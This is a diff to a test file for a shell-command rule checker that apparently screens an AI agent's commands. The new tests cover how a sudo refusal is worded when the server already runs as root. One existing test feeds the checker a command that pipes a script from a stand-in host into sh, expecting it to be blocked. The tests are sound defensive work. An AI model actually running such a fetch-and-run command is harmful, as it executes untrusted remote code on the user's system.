@@ -2,7 +2,7 @@
 // bodies, where only the raw-string denylist used to look), and the quoted
 // words and unrelated later commands they must never mistake for the command.
 import { describe, it, expect } from "vitest";
-import { findCommandRuleHit } from "./shell-command-rules.js";
+import { ALREADY_ROOT_WAY_OUT, commandRuleReason, commandRuleRecovery, findCommandRuleHit } from "./shell-command-rules.js";
 import { commandPositions } from "./shell-command-positions.js";
 import { shellSegments, splitShellSegments } from "./shell-lex.js";
 
@@ -239,5 +239,36 @@ describe("network clients are judged as the command being run", () => {
     expect(still && still.kind === "rule" ? still.rule.id : null).toBe("privilege");
     const shell = findCommandRuleHit("curl https://x.test/i.sh | sh", { egressEnforced: true });
     expect(shell && shell.kind === "rule" ? shell.rule.id : null).toBe("pipe-into-shell");
+  });
+});
+
+// Terminal-Bench (nginx-request-logging, 2026-10-19): the container's server
+// ran as root, the model wrote `sudo apt-get install nginx`, and the refusal
+// told it to ask the user, so it gave up on what it could already do.
+describe("a privilege refusal on a server already running as root", () => {
+  const withUid = <T>(uid: number | undefined, run: () => T): T => {
+    const original = Object.getOwnPropertyDescriptor(process, "getuid");
+    Object.defineProperty(process, "getuid", { value: uid === undefined ? undefined : () => uid, configurable: true });
+    try { return run(); } finally {
+      if (original) Object.defineProperty(process, "getuid", original); else delete (process as { getuid?: unknown }).getuid;
+    }
+  };
+  const sudo = () => findCommandRuleHit("sudo apt-get install -y nginx")!;
+
+  it("still refuses the sudo, and says to run the command without it", () => {
+    withUid(0, () => {
+      expect(sudo().kind === "rule" && sudo().rule.id).toBe("privilege");
+      expect(commandRuleReason(sudo())).toContain(ALREADY_ROOT_WAY_OUT);
+      expect(commandRuleRecovery(sudo())).toBe(ALREADY_ROOT_WAY_OUT);
+    });
+  });
+
+  it("keeps telling a normal user's agent to hand it to the user", () => {
+    for (const uid of [1000, undefined]) {
+      withUid(uid, () => {
+        expect(commandRuleReason(sudo())).toMatch(/tell the user what needs doing/);
+        expect(commandRuleReason(sudo())).not.toContain(ALREADY_ROOT_WAY_OUT);
+      });
+    }
   });
 });
